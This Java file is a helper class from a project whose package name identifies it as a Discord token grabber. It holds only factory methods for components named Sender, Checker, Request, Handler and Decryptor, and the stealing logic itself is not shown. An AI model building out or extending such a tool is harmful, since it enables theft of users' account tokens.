package com.github.dedinc.discordtokengrabber.utils;

public class Helper {
    public static Sender getSender() { return new Sender(); }
    public static UserAgents getUserAgents() { return new UserAgents(); }
    public static Checker getChecker() { return new Checker(); }
    public static Request getRequest() { return new Request(); }
    public static Handler getHandler() { return new Handler(); }
    public static Decryptor getDecryptor() { return new Decryptor(); }
}
